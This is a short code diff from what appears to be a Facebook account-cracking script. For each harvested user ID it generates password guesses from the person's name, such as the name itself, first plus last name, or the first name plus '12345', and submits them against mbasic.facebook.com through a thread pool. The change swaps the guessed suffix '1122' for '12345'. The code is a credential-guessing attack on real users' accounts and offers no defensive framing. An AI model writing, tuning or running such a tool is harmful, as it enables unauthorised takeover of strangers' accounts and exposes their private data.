@@ -628,9 +628,9 @@ class __xxx__:
                         uid, name = zsb.split('|')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+xz[1],xz[0]+"1122"]
+                            pwx = [name, xz[0]+xz[1],xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+xz[1],xz[0]+"1122"]
+                            pwx = [name, xz[0]+xz[1],xz[0]+"12345"]
                         ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
             
                     except:
@@ -646,6 +646,7 @@ class __xxx__:
             self.__pler__()
 
             
+
 
 def dupcutter():
 
